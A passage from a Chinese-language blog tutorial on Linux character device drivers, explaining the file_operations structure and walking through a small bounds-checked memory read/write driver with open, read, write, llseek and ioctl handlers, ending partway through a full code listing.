<code>include/linux/fs.h: file_operations</code> <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">file_operations</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">module</span> *owner;</span><br><span class="line">    <span class="built_in">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*aio_read) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*aio_write) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="built_in">int</span> (*readdir) (<span class="keyword">struct</span> file *, <span class="type">void</span> *, <span class="type">filldir_t</span>);</span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="title">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span></span>;</span><br><span class="line">    <span class="built_in">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="built_in">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="built_in">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="built_in">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="built_in">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="built_in">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="built_in">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="built_in">int</span> (*aio_fsync) (<span class="keyword">struct</span> kiocb *, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="built_in">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span></span>;</span><br><span class="line">    <span class="built_in">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="built_in">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="built_in">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **);</span><br><span class="line">    <span class="built_in">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">              <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="built_in">int</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 下面对
<code>file_operations</code> 结构体中的主要成员简要介绍：
<code>llseek()</code>
函数用来修改一个文件的当前读写位置，并将新位置返回，在出错时，这个函数返回一个负值。
<code>read()</code>
函数用来从设备中读取数据，成功时函数返回读取的字节数，出错时返回一个负值。
<code>write()</code>
函数向设备发送数据，成功时该函数返回写入的字节数。如果次函数未被实现，当用户进行
<code>write()</code> 系统调用时，将得到 <code>-EINVAL</code> 返回值。
<code>unlocked_ioctl()</code>
提供设备相关控制命令的实现，当调用成功时，返回给调用程序一个非负值。 ###
字符设备驱动组成 这里以一个简单的<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/LKMs_test/dev_test" >内存读写驱动 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例。
#### 头文件、宏及设备结构体</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_CLEAR 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_major = <span class="number">230</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_minor = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_param</span>(hello_major, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"><span class="built_in">module_param</span>(hello_minor, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">hello_dev</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">cdev</span> cdev;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MAX_SIZE];</span><br><span class="line">&#125; * hello_devp;</span><br></pre></td></tr></table></figure></div>
<h4 id="加载与卸载设备驱动">加载与卸载设备驱动</h4>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> __init <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">dev_t</span> devno = <span class="built_in">MKDEV</span>(hello_major, hello_minor);</span><br><span class="line">    <span class="keyword">if</span> (hello_major)</span><br><span class="line">        ret = <span class="built_in">register_chrdev_region</span>(devno, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = <span class="built_in">alloc_chrdev_region</span>(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">        hello_major = <span class="built_in">MAJOR</span>(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">    hello_devp = <span class="built_in">kzalloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> hello_dev), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!hello_devp) &#123;</span><br><span class="line">        <span class="built_in">unregister_chrdev_region</span>(devno, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cdev_init</span>(&amp;hello_devp-&gt;cdev, &amp;hello_fops);</span><br><span class="line">    hello_devp-&gt;cdev.owner = THIS_MODULE;</span><br><span class="line">    <span class="type">int</span> err = (<span class="type">int</span>) <span class="built_in">cdev_add</span>(&amp;hello_devp-&gt;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="built_in">printk</span>(<span class="string">&quot;[-] Error %d adding myko %d\n&quot;</span>, err, hello_minor);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cdev_del</span>(&amp;hello_devp-&gt;cdev);</span><br><span class="line">    <span class="built_in">kfree</span>(hello_devp);</span><br><span class="line">    <span class="built_in">unregister_chrdev_region</span>(<span class="built_in">MKDEV</span>(hello_major, hello_minor), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br></pre></td></tr></table></figure></div>
<p><code>cdev_init</code> 初始化 <code>cdev</code> 结构体，其中与驱动的
<code>cdev</code> 关联的 <code>file_operations</code> 结构体如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">file_operations</span> hello_fops = &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .llseek = hello_llseek,</span><br><span class="line">        .read = hello_read,</span><br><span class="line">        .write = hello_write,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">        .open = hello_open,</span><br><span class="line">        .release = hello_releace,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h4 id="使用文件私有数据">使用文件私有数据</h4>
<p>大多数Linux驱动遵循一个”潜规则”，那就是将文件的私有数据
<code>private_data</code> 指向设备结构体，再用
<code>read()</code>、<code>write()</code>、<code>ioctl()</code>、<code>llseek()</code>
等函数通过 <code>private_data</code> 访问设备结构体。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> </span>&#123;</span><br><span class="line">    filp-&gt;private_data = hello_devp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> </span>&#123;</span><br><span class="line">    filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="读写函数">读写函数</h4>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_to_user</span>(buf, dev-&gt;mem + *pos, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] Read %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(dev-&gt;mem + *pos, buf, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] Written %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于用户空间不能直接访问内核空间的内存，因此借助了函数
<code>copy_from_user()</code>
完成用户空间缓冲区到内核空间的复制，<code>copy_to_user()</code>
完成内核空间到用户空间缓冲区的复制。它们的原型如下： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">copy_from_user</span><span class="params">(<span class="type">void</span> *to, <span class="type">const</span> <span class="type">void</span> __user *from, <span class="type">unsigned</span> <span class="type">long</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="title">copy_to_user</span><span class="params">(<span class="type">void</span> __user *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> count)</span></span>;</span><br></pre></td></tr></table></figure></div>
完全复制成功返回值为 0 ，如果复制失败，则返回负值。 读和写函数中的
<code>__user</code>
是一个宏，表明其后的指针指向用户空间，实际上更多地充当了代码自注释功能。
#### seek函数 <code>seek()</code>
函数对文件定位的起始地址可以是文件开头（SEEK_SET，0）、当前位置（SEEK_CUR，1）和文件尾（SEEK_END，2），这里只实现了支持从文件开头和当前位置的相对偏移。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">loff_t</span> <span class="title">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (op != <span class="number">0</span> &amp;&amp; op != <span class="number">1</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">1</span>) offset += filp-&gt;f_pos;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt; MAX_SIZE) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> filp-&gt;f_pos = offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="ioctl函数">ioctl函数</h4>
<p>用来自定义的函数，这里自定义了清内存的函数。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> <span class="title">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printk</span>(<span class="string">&quot;[-] No device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> MEM_CLEAR:</span><br><span class="line">            <span class="built_in">memset</span>(dev-&gt;mem, <span class="number">0</span>, <span class="built_in">sizeof</span>(dev-&gt;mem));</span><br><span class="line">            <span class="built_in">printk</span>(<span class="string">&quot;[+] Clear success\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printk</span>(<span class="string">&quot;[-] Error command\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ###
完整代码</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_CLEAR 0x1</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_major = <span class="number">230</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_minor = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_param</span>(hello_major, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"><span class="built_in">module_param</span>(hello_minor, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">hello_dev</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">cdev</span> cdev;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MAX_SIZE];</span><br><span class="line">&#125; * hello_devp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> <span class="title">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">loff_t</span> <span class="title">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">file_operations</span> hello_fops = &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .llseek = hello_llseek,</span><br><span class="line">        .read = hello_read,</span><br><span class="line">        .write = hello_write,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">        .open = hello_open,</span><br><span class="line">        .release = hello_releace,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> __init <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">dev_t</span> devno = <span class="built_in">MKDEV</span>(hello_major, hello_minor);</span><br><span class="line">    <span class="keyword">if</span> (hello_major)</span><br><span class="line">        ret = <span class="built_in">register_chrdev_region</span>(devno, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = <span class="built_in">alloc_chrdev_region</span>(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">        hello_major = <span class="built_in">MAJOR</span>(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">    hello_devp = <span class="built_in">kzalloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> hello_dev), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!hello_devp) &#123;</span><br><span class="line">        <span class="built_in">unregister_chrdev_region</span>(devno, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cdev_init</span>(&amp;hello_devp-&gt;cdev, &amp;hello_fops);</span><br><span class="line">    hello_devp-&gt;cdev.owner = THIS_MODULE;</span><br><span class="line">    <span class="type">int</span> err = (<span class="type">int</span>) <span class="built_in">cdev_add</span>(&amp;hello_devp-&gt;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="built_in">printk</span>(<span class="string">&quot;[-] Error %d adding myko %d\n&quot;</span>, err, hello_minor);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cdev_del</span>(&amp;hello_devp-&gt;cdev);</span><br><span class="line">    <span class="built_in">kfree</span>(hello_devp);</span><br><span class="line">    <span class="built_in">unregister_chrdev_region</span>(<span class="built_in">MKDEV</span>(hello_major, hello_minor), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> </span>&#123;</span><br><span class="line">    filp-&gt;private_data = hello_devp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> </span>&#123;</span><br><span class="line">    filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> <span class="title">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printk</span>(<span class="string">&quot;[-] No device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> MEM_CLEAR:</span><br><span class="line">            <span class="built_in">memset</span>(dev-&gt;mem, <span class="number">0</span>, <span class="built_in">sizeof</span>(dev-&gt;mem));</span><br><span class="line">            <span class="built_in">printk</span>(<span class="string">&quot;[+] Clear success\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printk</span>(<span class="string">&quot;[-] Error command\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_to_user</span>(buf, dev-&gt;mem + *pos, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] Read %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(dev-&gt;mem + *pos, buf, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] Written %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 